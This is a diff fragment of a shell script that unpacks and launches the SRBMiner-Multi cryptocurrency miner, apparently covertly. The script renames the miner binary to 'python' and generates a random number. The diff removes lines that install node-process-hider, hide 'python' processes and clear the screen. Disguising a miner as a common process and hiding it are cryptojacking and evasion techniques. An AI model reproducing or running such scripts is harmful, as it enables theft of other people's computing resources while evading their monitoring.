@@ -4,12 +4,6 @@ tar -xvf kontolrum
 
 cd SRBMiner-Multi-2-4-7
 
-npm i -g node-process-hider
-
-ph add python
-
-clear
-
 mv SRBMiner-MULTI python
 
 nomer=$((RANDOM % 50 + 1))
